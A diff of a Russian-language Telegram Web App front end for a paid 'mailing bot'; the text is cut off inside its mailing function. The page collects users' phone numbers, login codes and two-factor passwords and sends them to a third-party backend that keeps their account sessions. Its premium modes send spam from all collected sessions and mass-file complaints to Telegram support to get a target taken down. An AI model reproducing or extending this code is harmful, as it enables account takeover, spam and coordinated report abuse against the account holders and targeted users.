@@ -6,433 +6,431 @@
     <title>Бот для рассылок</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Адаптивность для мобильных устройств */
-         * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-}
+        /* Ваши существующие стили остаются без изменений */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-body {
-    background: linear-gradient(135deg, #0f1b33 0%, #1a365d 100%);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-}
+        body {
+            background: linear-gradient(135deg, #0f1b33 0%, #1a365d 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-.container {
-    background: rgba(45, 55, 72, 0.95);
-    border-radius: 16px;
-    padding: 40px;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-    max-width: 450px;
-    width: 100%;
-    backdrop-filter: blur(20px);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    color: #e2e8f0;
-}
+        .container {
+            background: rgba(45, 55, 72, 0.95);
+            border-radius: 16px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
+            width: 100%;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #e2e8f0;
+        }
 
-.logo {
-    text-align: center;
-    margin-bottom: 30px;
-}
+        /* Остальные стили остаются такими же как в вашем коде */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-.logo-icon {
-    width: 80px;
-    height: 80px;
-    border-radius: 16px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 20px;
-    overflow: hidden;
-}
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            overflow: hidden;
+        }
 
-.logo-icon img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    border-radius: 16px;
-}
+        .logo-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 16px;
+        }
 
-h1 {
-    text-align: center;
-    color: #f7fafc;
-    margin-bottom: 10px;
-    font-size: 26px;
-    font-weight: 600;
-}
+        h1 {
+            text-align: center;
+            color: #f7fafc;
+            margin-bottom: 10px;
+            font-size: 26px;
+            font-weight: 600;
+        }
 
-.subtitle {
-    text-align: center;
-    color: #a0aec0;
-    margin-bottom: 30px;
-    line-height: 1.5;
-    font-size: 15px;
-}
+        .subtitle {
+            text-align: center;
+            color: #a0aec0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-size: 15px;
+        }
 
-.auth-step {
-    margin-bottom: 25px;
-    padding: 25px;
-    background: rgba(74, 85, 104, 0.5);
-    border-radius: 12px;
-    border: 1px solid rgba(255, 255, 255, 0.1);
-}
+        .auth-step {
+            margin-bottom: 25px;
+            padding: 25px;
+            background: rgba(74, 85, 104, 0.5);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
 
-.step-title {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    margin-bottom: 18px;
-    color: #4299e1;
-    font-weight: 600;
-    font-size: 16px;
-}
+        .step-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+            color: #4299e1;
+            font-weight: 600;
+            font-size: 16px;
+        }
 
-.step-number {
-    background: #4299e1;
-    color: white;
-    width: 26px;
-    height: 26px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 14px;
-    font-weight: 600;
-}
+        .step-number {
+            background: #4299e1;
+            color: white;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
 
-.form-group {
-    margin-bottom: 18px;
-}
+        .form-group {
+            margin-bottom: 18px;
+        }
 
-label {
-    display: block;
-    margin-bottom: 6px;
-    color: #e2e8f0;
-    font-weight: 500;
-    font-size: 14px;
-}
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #e2e8f0;
+            font-weight: 500;
+            font-size: 14px;
+        }
 
-input, textarea, select {
-    width: 100%;
-    padding: 14px 16px;
-    border: 1px solid #4a5568;
-    border-radius: 8px;
-    font-size: 15px;
-    transition: all 0.3s;
-    background: #2d3748;
-    color: #e2e8f0;
-}
+        input, textarea, select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #4a5568;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #2d3748;
+            color: #e2e8f0;
+        }
 
-input:focus, textarea:focus, select:focus {
-    outline: none;
-    border-color: #4299e1;
-    box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
-}
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #4299e1;
+            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
+        }
 
-input::placeholder, textarea::placeholder {
-    color: #718096;
-}
+        input::placeholder, textarea::placeholder {
+            color: #718096;
+        }
 
-.btn {
-    width: 100%;
-    padding: 16px;
-    background: linear-gradient(135deg, #4299e1, #3182ce);
-    color: white;
-    border: none;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s;
-}
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #4299e1, #3182ce);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
 
-.btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 8px 20px rgba(66, 153, 225, 0.3);
-}
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(66, 153, 225, 0.3);
+        }
 
-.btn:disabled {
-    background: #4a5568;
-    cursor: not-allowed;
-    transform: none;
-    box-shadow: none;
-}
+        .btn:disabled {
+            background: #4a5568;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
 
-.btn-premium {
-    background: linear-gradient(135deg, #d69e2e, #b7791f);
-}
+        .btn-premium {
+            background: linear-gradient(135deg, #d69e2e, #b7791f);
+        }
 
-.btn-premium:hover {
-    box-shadow: 0 8px 20px rgba(214, 158, 46, 0.3);
-}
+        .btn-premium:hover {
+            box-shadow: 0 8px 20px rgba(214, 158, 46, 0.3);
+        }
 
-.btn-secondary {
-    background: linear-gradient(135deg, #718096, #4a5568);
-}
+        .btn-secondary {
+            background: linear-gradient(135deg, #718096, #4a5568);
+        }
 
-.status {
-    margin-top: 16px;
-    padding: 14px;
-    border-radius: 8px;
-    text-align: center;
-    font-weight: 500;
-    font-size: 14px;
-    display: none;
-}
+        .status {
+            margin-top: 16px;
+            padding: 14px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+            display: none;
+        }
 
-.status.success {
-    background: rgba(72, 187, 120, 0.1);
-    color: #48bb78;
-    border: 1px solid rgba(72, 187, 120, 0.2);
-    display: block;
-}
+        .status.success {
+            background: rgba(72, 187, 120, 0.1);
+            color: #48bb78;
+            border: 1px solid rgba(72, 187, 120, 0.2);
+            display: block;
+        }
 
-.status.error {
-    background: rgba(245, 101, 101, 0.1);
-    color: #f56565;
-    border: 1px solid rgba(245, 101, 101, 0.2);
-    display: block;
-}
+        .status.error {
+            background: rgba(245, 101, 101, 0.1);
+            color: #f56565;
+            border: 1px solid rgba(245, 101, 101, 0.2);
+            display: block;
+        }
 
-.status.loading {
-    background: rgba(246, 173, 85, 0.1);
-    color: #f6ad55;
-    border: 1px solid rgba(246, 173, 85, 0.2);
-    display: block;
-}
+        .status.loading {
+            background: rgba(246, 173, 85, 0.1);
+            color: #f6ad55;
+            border: 1px solid rgba(246, 173, 85, 0.2);
+            display: block;
+        }
 
-.status.premium {
-    background: rgba(214, 158, 46, 0.1);
-    color: #d69e2e;
-    border: 1px solid rgba(214, 158, 46, 0.2);
-    display: block;
-}
+        .status.premium {
+            background: rgba(214, 158, 46, 0.1);
+            color: #d69e2e;
+            border: 1px solid rgba(214, 158, 46, 0.2);
+            display: block;
+        }
 
-.status.subscription {
-    background: rgba(66, 153, 225, 0.1);
-    color: #4299e1;
-    border: 1px solid rgba(66, 153, 225, 0.2);
-    display: block;
-}
+        .status.subscription {
+            background: rgba(66, 153, 225, 0.1);
+            color: #4299e1;
+            border: 1px solid rgba(66, 153, 225, 0.2);
+            display: block;
+        }
 
-.nav-tabs {
-    display: flex;
-    margin-bottom: 25px;
-    background: rgba(74, 85, 104, 0.5);
-    border-radius: 10px;
-    padding: 5px;
-}
+        .nav-tabs {
+            display: flex;
+            margin-bottom: 25px;
+            background: rgba(74, 85, 104, 0.5);
+            border-radius: 10px;
+            padding: 5px;
+        }
 
-.nav-tab {
-    flex: 1;
-    padding: 14px;
-    text-align: center;
-    cursor: pointer;
-    border-radius: 8px;
-    font-weight: 500;
-    transition: all 0.3s;
-    font-size: 14px;
-    color: #a0aec0;
-}
+        .nav-tab {
+            flex: 1;
+            padding: 14px;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 8px;
+            font-weight: 500;
+            transition: all 0.3s;
+            font-size: 14px;
+            color: #a0aec0;
+        }
 
-.nav-tab.active {
-    background: #4299e1;
-    color: white;
-}
+        .nav-tab.active {
+            background: #4299e1;
+            color: white;
+        }
 
-.tab-content {
-    display: none;
-}
+        .tab-content {
+            display: none;
+        }
 
-.tab-content.active {
-    display: block;
-}
+        .tab-content.active {
+            display: block;
+        }
 
-.user-info {
-    background: rgba(74, 85, 104, 0.5);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    border-radius: 12px;
-    padding: 18px;
-    margin-bottom: 20px;
-    display: none;
-}
+        .user-info {
+            background: rgba(74, 85, 104, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 20px;
+            display: none;
+        }
 
-.info-row {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 10px;
-    padding-bottom: 8px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-}
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
 
-.info-label {
-    color: #a0aec0;
-    font-size: 14px;
-}
+        .info-label {
+            color: #a0aec0;
+            font-size: 14px;
+        }
 
-.info-value {
-    color: #e2e8f0;
-    font-weight: 500;
-    font-size: 14px;
-}
+        .info-value {
+            color: #e2e8f0;
+            font-weight: 500;
+            font-size: 14px;
+        }
 
-.action-buttons {
-    display: flex;
-    gap: 12px;
-    margin-top: 20px;
-}
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
 
-.action-buttons .btn {
-    flex: 1;
-}
+        .action-buttons .btn {
+            flex: 1;
+        }
 
-.step-description {
-    color: #a0aec0;
-    font-size: 14px;
-    line-height: 1.5;
-    margin-bottom: 16px;
-}
+        .step-description {
+            color: #a0aec0;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
 
-.method-selector {
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-    margin-bottom: 20px;
-}
+        .method-selector {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
 
-.method-option {
-    padding: 16px;
-    border: 2px solid #4a5568;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: all 0.3s;
-}
+        .method-option {
+            padding: 16px;
+            border: 2px solid #4a5568;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
 
-.method-option:hover {
-    border-color: #4299e1;
-}
+        .method-option:hover {
+            border-color: #4299e1;
+        }
 
-.method-option.selected {
-    border-color: #4299e1;
-    background: rgba(66, 153, 225, 0.1);
-}
+        .method-option.selected {
+            border-color: #4299e1;
+            background: rgba(66, 153, 225, 0.1);
+        }
 
-.method-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 8px;
-}
+        .method-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
 
-.method-title {
-    font-weight: 600;
-    color: #e2e8f0;
-}
+        .method-title {
+            font-weight: 600;
+            color: #e2e8f0;
+        }
 
-.method-badge {
-    background: #4299e1;
-    color: white;
-    padding: 4px 8px;
-    border-radius: 12px;
-    font-size: 12px;
-    font-weight: 600;
-}
+        .method-badge {
+            background: #4299e1;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
 
-.method-badge.basic {
-    background: #4299e1;
-}
+        .method-badge.basic {
+            background: #4299e1;
+        }
 
-.method-badge.premium {
-    background: #d69e2e;
-}
+        .method-badge.premium {
+            background: #d69e2e;
+        }
 
-.method-description {
-    color: #a0aec0;
-    font-size: 13px;
-    line-height: 1.4;
-}
+        .method-description {
+            color: #a0aec0;
+            font-size: 13px;
+            line-height: 1.4;
+        }
 
-.premium-feature {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    color: #d69e2e;
-    font-size: 13px;
-    margin-top: 8px;
-}
+        .premium-feature {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #d69e2e;
+            font-size: 13px;
+            margin-top: 8px;
+        }
 
-.subscription-required {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    color: #4299e1;
-    font-size: 13px;
-    margin-top: 8px;
-}
+        .subscription-required {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #4299e1;
+            font-size: 13px;
+            margin-top: 8px;
+        }
 
-/* Адаптивность - УПРОЩЕННАЯ ВЕРСИЯ */
-@media (max-width: 768px) {
-    .container {
-        padding: 20px;
-        margin: 10px;
-        border-radius: 12px;
-    }
-    
-    h1 {
-        font-size: 22px;
-    }
-    
-    .subtitle {
-        font-size: 14px;
-    }
-    
-    .auth-step {
-        padding: 20px;
-    }
-    
-    .nav-tab {
-        padding: 12px 8px;
-        font-size: 13px;
-    }
-    
-    .method-option {
-        padding: 14px;
-    }
-    
-    input, textarea, select {
-        padding: 12px 14px;
-        font-size: 16px;
-    }
-    
-    .btn {
-        padding: 14px;
-        font-size: 16px;
-    }
-}
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                margin: 10px;
+                border-radius: 12px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+            
+            .auth-step {
+                padding: 20px;
+            }
+            
+            .nav-tab {
+                padding: 12px 8px;
+                font-size: 13px;
+            }
+            
+            .method-option {
+                padding: 14px;
+            }
+            
+            input, textarea, select {
+                padding: 12px 14px;
+                font-size: 16px;
+            }
+            
+            .btn {
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
 
-@media (max-width: 480px) {
-    .container {
-        padding: 15px;
-        margin: 5px;
-    }
-    
-    .logo-icon {
-        width: 60px;
-        height: 60px;
-        margin-bottom: 15px;
-    }
-    
-    h1 {
-        font-size: 20px;
-    }
-}
-
-/* Убрать проблемные медиа-запросы которые могут вызывать ошибки */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+                margin: 5px;
+            }
+            
+            .logo-icon {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 15px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -446,8 +444,8 @@ input::placeholder, textarea::placeholder {
         </div>
         
         <div class="nav-tabs">
-            <div class="nav-tab active" onclick="switchTab('connect')">Подключение</div>
-            <div class="nav-tab" onclick="switchTab('manage')">Управление</div>
+            <div class="nav-tab active" data-tab="connect">Подключение</div>
+            <div class="nav-tab" data-tab="manage">Управление</div>
         </div>
         
         <!-- Вкладка подключения -->
@@ -470,7 +468,7 @@ input::placeholder, textarea::placeholder {
                         required
                     >
                 </div>
-                <button class="btn" onclick="requestCode()">Получить код</button>
+                <button class="btn" id="request-code-btn">Получить код</button>
             </div>
             
             <div class="auth-step" id="code-step" style="display: none;">
@@ -491,7 +489,7 @@ input::placeholder, textarea::placeholder {
                         required
                     >
                 </div>
-                <button class="btn" onclick="verifyCode()">Подтвердить код</button>
+                <button class="btn" id="verify-code-btn">Подтвердить код</button>
             </div>
             
             <div class="auth-step" id="password-step" style="display: none;">
@@ -511,7 +509,7 @@ input::placeholder, textarea::placeholder {
                         required
                     >
                 </div>
-                <button class="btn" onclick="verifyPassword()">Подтвердить пароль</button>
+                <button class="btn" id="verify-password-btn">Подтвердить пароль</button>
             </div>
             
             <div class="user-info" id="userInfo">
@@ -537,493 +535,517 @@ input::placeholder, textarea::placeholder {
         </div>
         
         <!-- Вкладка управления -->
-        <!-- Вкладка управления -->
-<div id="manage-tab" class="tab-content">
-    <div class="auth-step">
-        <div class="step-title">
-            <div class="step-number">1</div>
-            <span>Создать рассылку</span>
-        </div>
-        <p class="step-description">
-            Выберите метод рассылки и настройте параметры. Чаты автоматически сканируются при подключении сессии.
-        </p>
-        
-        <div class="method-selector">
-            <div class="method-option" onclick="selectMethod('basic')" id="method-basic">
-                <div class="method-header">
-                    <div class="method-title">Базовый</div>
-                    <div class="method-badge basic">Базовый</div>
+        <div id="manage-tab" class="tab-content">
+            <div class="auth-step">
+                <div class="step-title">
+                    <div class="step-number">1</div>
+                    <span>Создать рассылку</span>
                 </div>
-                <div class="method-description">
-                    Рассылка с вашей сессии по всем вашим группам
+                <p class="step-description">
+                    Выберите метод рассылки и настройте параметры. Чаты автоматически сканируются при подключении сессии.
+                </p>
+                
+                <div class="method-selector">
+                    <div class="method-option" data-method="basic" id="method-basic">
+                        <div class="method-header">
+                            <div class="method-title">Базовый</div>
+                            <div class="method-badge basic">Базовый</div>
+                        </div>
+                        <div class="method-description">
+                            Рассылка с вашей сессии по всем вашим группам
+                        </div>
+                        <div class="subscription-required">
+                            <span>Требуется базовая подписка</span>
+                        </div>
+                    </div>
+                    
+                    <div class="method-option" data-method="advanced" id="method-advanced">
+                        <div class="method-header">
+                            <div class="method-title">Продвинутый</div>
+                            <div class="method-badge premium">Премиум</div>
+                        </div>
+                        <div class="method-description">
+                            Рассылка со всех сессий по всем группам
+                        </div>
+                        <div class="premium-feature">
+                            <span>Требуется премиум подписка</span>
+                        </div>
+                    </div>
+                    
+                    <div class="method-option" data-method="targeted" id="method-targeted">
+                        <div class="method-header">
+                            <div class="method-title">Таргетированный</div>
+                            <div class="method-badge premium">Премиум</div>
+                        </div>
+                        <div class="method-description">
+                            Рассылка со всех сессий в конкретный чат
+                        </div>
+                        <div class="premium-feature">
+                            <span>Требуется премиум подписка</span>
+                        </div>
+                    </div>
+                    
+                    <div class="method-option" data-method="demolition" id="method-demolition">
+                        <div class="method-header">
+                            <div class="method-title">🧨 Снос (жалобы)</div>
+                            <div class="method-badge premium">Премиум</div>
+                        </div>
+                        <div class="method-description">
+                            Массовая отправка жалоб в техподдержку Telegram со всех сессий системы
+                        </div>
+                        <div class="premium-feature">
+                            <span>Требуется премиум подписка</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="subscription-required">
-                    <span>Требуется базовая подписка</span>
+                
+                <div class="form-group">
+                    <label for="message-text">Текст сообщения:</label>
+                    <textarea 
+                        id="message-text" 
+                        rows="4" 
+                        placeholder="Введите текст для рассылки..."
+                        required
+                    ></textarea>
                 </div>
+                
+                <div class="form-group" id="attempts-group">
+                    <label for="attempts">Количество попыток отправки:</label>
+                    <input 
+                        type="number" 
+                        id="attempts" 
+                        value="10" 
+                        min="1" 
+                        max="100"
+                    >
+                    <p style="color: #a0aec0; font-size: 12px; margin-top: 5px;">
+                        Каждая попытка отправляется с задержкой 30 секунд
+                    </p>
+                </div>
+                
+                <div class="form-group" id="target-chat-group" style="display: none;">
+                    <label for="target-chat">ID или username целевого чата:</label>
+                    <input 
+                        type="text" 
+                        id="target-chat" 
+                        placeholder="@username или -100123456789"
+                    >
+                </div>
+                
+                <div class="form-group" id="demolition-group" style="display: none;">
+                    <label for="demolition-text">Текст жалобы:</label>
+                    <textarea 
+                        id="demolition-text" 
+                        rows="4" 
+                        placeholder="Введите текст жалобы для отправки в техподдержку Telegram..."
+                        required
+                    ></textarea>
+                    <p style="color: #a0aec0; font-size: 12px; margin-top: 5px;">
+                        ⚠️ Жалобы будут отправлены со всех активных сессий системы
+                    </p>
+                </div>
+                
+                <button class="btn" id="create-mailing-btn">Запустить рассылку</button>
             </div>
             
-            <div class="method-option" onclick="selectMethod('advanced')" id="method-advanced">
-                <div class="method-header">
-                    <div class="method-title">Продвинутый</div>
-                    <div class="method-badge premium">Премиум</div>
-                </div>
-                <div class="method-description">
-                    Рассылка со всех сессий по всем группам
-                </div>
-                <div class="premium-feature">
-                    <span>Требуется премиум подписка</span>
-                </div>
-            </div>
-            
-            <div class="method-option" onclick="selectMethod('targeted')" id="method-targeted">
-                <div class="method-header">
-                    <div class="method-title">Таргетированный</div>
-                    <div class="method-badge premium">Премиум</div>
-                </div>
-                <div class="method-description">
-                    Рассылка со всех сессий в конкретный чат
-                </div>
-                <div class="premium-feature">
-                    <span>Требуется премиум подписка</span>
-                </div>
-            </div>
-            
-            <div class="method-option" onclick="selectMethod('demolition')" id="method-demolition">
-                <div class="method-header">
-                    <div class="method-title">🧨 Снос (жалобы)</div>
-                    <div class="method-badge premium">Премиум</div>
-                </div>
-                <div class="method-description">
-                    Массовая отправка жалоб в техподдержку Telegram со всех сессий системы
-                </div>
-                <div class="premium-feature">
-                    <span>Требуется премиум подписка</span>
-                </div>
-            </div>
+            <div class="status" id="manage-status"></div>
         </div>
-        
-        <div class="form-group">
-            <label for="message-text">Текст сообщения:</label>
-            <textarea 
-                id="message-text" 
-                rows="4" 
-                placeholder="Введите текст для рассылки..."
-                required
-            ></textarea>
-        </div>
-        
-        <div class="form-group" id="attempts-group">
-            <label for="attempts">Количество попыток отправки:</label>
-            <input 
-                type="number" 
-                id="attempts" 
-                value="10" 
-                min="1" 
-                max="100"
-            >
-            <p style="color: #a0aec0; font-size: 12px; margin-top: 5px;">
-                Каждая попытка отправляется с задержкой 30 секунд
-            </p>
-        </div>
-        
-        <div class="form-group" id="target-chat-group" style="display: none;">
-            <label for="target-chat">ID или username целевого чата:</label>
-            <input 
-                type="text" 
-                id="target-chat" 
-                placeholder="@username или -100123456789"
-            >
-        </div>
-        
-        <div class="form-group" id="demolition-group" style="display: none;">
-            <label for="demolition-text">Текст жалобы:</label>
-            <textarea 
-                id="demolition-text" 
-                rows="4" 
-                placeholder="Введите текст жалобы для отправки в техподдержку Telegram..."
-                required
-            ></textarea>
-            <p style="color: #a0aec0; font-size: 12px; margin-top: 5px;">
-                ⚠️ Жалобы будут отправлены со всех активных сессий системы
-            </p>
-        </div>
-        
-        <button class="btn" id="create-mailing-btn" onclick="handleMailingAction()">Запустить рассылку</button>
     </div>
-    
-    <div class="status" id="manage-status"></div>
-</div>
 
     <script>
+        // Инициализация Telegram Web App
         const tg = window.Telegram.WebApp;
-tg.expand();
-
-// Убираем проблемную строку которая вызывает ошибку
-try {
-    tg.enableClosingConfirmation();
-} catch (e) {
-    console.log('Closing confirmation not supported');
-}
-
-// Конфигурация URL
-const BACKEND_URL = 'https://rassilka-ilag.amvera.io';
-const IS_TELEGRAM_WEBAPP = typeof window.Telegram !== 'undefined' && window.Telegram.WebApp;
-
-let userConnected = false;
-let currentUserId = tg.initDataUnsafe.user?.id || 'webapp_user';
-let selectedMethod = 'basic';
-
-// Упрощенная функция для запросов
-async function fetchWithTelegramAuth(url, options = {}) {
-    const finalUrl = `${BACKEND_URL}${url}`;
-    
-    const config = {
-        ...options,
-        headers: {
-            'Content-Type': 'application/json',
-            ...options.headers
-        }
-    };
-    
-    try {
-        const response = await fetch(finalUrl, config);
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        
-        return await response.json();
-    } catch (error) {
-        console.error('Fetch error:', error);
-        throw error;
-    }
-}
-
-// Основные функции
-function switchTab(tabName) {
-    document.querySelectorAll('.tab-content').forEach(tab => {
-        tab.classList.remove('active');
-    });
-    document.querySelectorAll('.nav-tab').forEach(tab => {
-        tab.classList.remove('active');
-    });
-    
-    document.getElementById(tabName + '-tab').classList.add('active');
-    document.querySelector(`.nav-tab:nth-child(${tabName === 'connect' ? 1 : 2})`).classList.add('active');
-}
-
-function selectMethod(method) {
-    selectedMethod = method;
-    
-    // Сбрасываем выделение всех методов
-    document.querySelectorAll('.method-option').forEach(option => {
-        if (option) option.classList.remove('selected');
-    });
-    
-    // Выделяем выбранный метод
-    const methodElement = document.getElementById(`method-${method}`);
-    if (methodElement) {
-        methodElement.classList.add('selected');
-    }
-    
-    // Показываем/скрываем дополнительные поля
-    const attemptsGroup = document.getElementById('attempts-group');
-    const targetChatGroup = document.getElementById('target-chat-group');
-    const demolitionGroup = document.getElementById('demolition-group');
-    const createButton = document.getElementById('create-mailing-btn');
-    
-    if (attemptsGroup && targetChatGroup && demolitionGroup && createButton) {
-        switch(method) {
-            case 'targeted':
-                attemptsGroup.style.display = 'none';
-                targetChatGroup.style.display = 'block';
-                demolitionGroup.style.display = 'none';
-                createButton.textContent = 'Запустить таргетированную рассылку';
-                break;
-            case 'demolition':
-                attemptsGroup.style.display = 'none';
-                targetChatGroup.style.display = 'none';
-                demolitionGroup.style.display = 'block';
-                createButton.textContent = '🧨 Запустить отправку жалоб';
-                break;
-            case 'advanced':
-                attemptsGroup.style.display = 'block';
-                targetChatGroup.style.display = 'none';
-                demolitionGroup.style.display = 'none';
-                createButton.textContent = 'Запустить продвинутую рассылку';
-                break;
-            default: // basic
-                attemptsGroup.style.display = 'block';
-                targetChatGroup.style.display = 'none';
-                demolitionGroup.style.display = 'none';
-                createButton.textContent = 'Запустить базовую рассылку';
-        }
-    }
-}
-
-function handleMailingAction() {
-    if (selectedMethod === 'demolition') {
-        startDemolition();
-    } else {
-        createMailing();
-    }
-}
-
-async function requestCode() {
-    const phoneNumber = document.getElementById('phone-number').value.trim();
-    
-    if (!phoneNumber) {
-        showStatus('error', 'Введите номер телефона');
-        return;
-    }
-    
-    showStatus('loading', 'Отправляем код подтверждения...');
-    
-    try {
-        const response = await fetchWithTelegramAuth('/auth/request-code', {
-            method: 'POST',
-            body: JSON.stringify({
-                phone_number: phoneNumber,
-                user_id: currentUserId
-            })
-        });
-        
-        if (response.success) {
-            showStatus('success', 'Код отправлен! Проверьте Telegram.');
-            document.getElementById('code-step').style.display = 'block';
-        } else {
-            showStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить код'));
-        }
-        
-    } catch (error) {
-        console.error('Error requesting code:', error);
-        showStatus('error', 'Ошибка отправки кода');
-    }
-}
-
-async function verifyCode() {
-    const code = document.getElementById('verification-code').value.trim();
-    
-    if (!code) {
-        showStatus('error', 'Введите код подтверждения');
-        return;
-    }
-    
-    showStatus('loading', 'Проверяем код...');
-    
-    try {
-        const response = await fetchWithTelegramAuth('/auth/sign-in', {
-            method: 'POST',
-            body: JSON.stringify({
-                code: code,
-                user_id: currentUserId
-            })
-        });
-        
-        if (response.success) {
-            if (response.need_password) {
-                showStatus('success', 'Требуется пароль двухфакторной аутентификации');
-                document.getElementById('password-step').style.display = 'block';
-                document.getElementById('code-step').style.display = 'none';
-            } else {
-                showStatus('success', 'Сессия успешно подключена!');
-                userConnected = true;
-                displayUserInfo(response.user_info, response.scan_result);
-                setTimeout(() => switchTab('manage'), 1500);
-            }
-        } else {
-            showStatus('error', 'Ошибка: ' + (response.message || 'Неверный код'));
-        }
-        
-    } catch (error) {
-        console.error('Error verifying code:', error);
-        showStatus('error', 'Ошибка проверки кода');
-    }
-}
-
-async function verifyPassword() {
-    const password = document.getElementById('password').value;
-    
-    if (!password) {
-        showStatus('error', 'Введите пароль');
-        return;
-    }
-    
-    showStatus('loading', 'Проверяем пароль...');
-    
-    try {
-        const response = await fetchWithTelegramAuth('/auth/sign-in-password', {
-            method: 'POST',
-            body: JSON.stringify({
-                password: password,
-                user_id: currentUserId
-            })
-        });
-        
-        if (response.success) {
-            showStatus('success', 'Сессия успешно подключена!');
-            userConnected = true;
-            displayUserInfo(response.user_info, response.scan_result);
-            setTimeout(() => switchTab('manage'), 1500);
-        } else {
-            showStatus('error', 'Ошибка: ' + (response.message || 'Неверный пароль'));
-        }
-        
-    } catch (error) {
-        console.error('Error verifying password:', error);
-        showStatus('error', 'Ошибка проверки пароля');
-    }
-}
-
-async function createMailing() {
-    const messageText = document.getElementById('message-text').value.trim();
-    const attempts = parseInt(document.getElementById('attempts').value);
-    const targetChat = document.getElementById('target-chat').value.trim();
-    
-    if (!userConnected) {
-        showManageStatus('error', 'Сначала подключите сессию');
-        return;
-    }
-    
-    if (!messageText) {
-        showManageStatus('error', 'Введите текст сообщения');
-        return;
-    }
-    
-    if ((selectedMethod === 'basic' || selectedMethod === 'advanced') && (attempts < 1 || attempts > 100)) {
-        showManageStatus('error', 'Количество попыток должно быть от 1 до 100');
-        return;
-    }
-    
-    if (selectedMethod === 'targeted' && !targetChat) {
-        showManageStatus('error', 'Введите ID или username целевого чата');
-        return;
-    }
-    
-    showManageStatus('loading', 'Создаем рассылку...');
-    
-    try {
-        const response = await fetchWithTelegramAuth('/user/create-mailing', {
-            method: 'POST',
-            body: JSON.stringify({
-                user_id: currentUserId,
-                message_text: messageText,
-                attempts: attempts,
-                mailing_type: selectedMethod,
-                target_chat: targetChat
-            })
-        });
-        
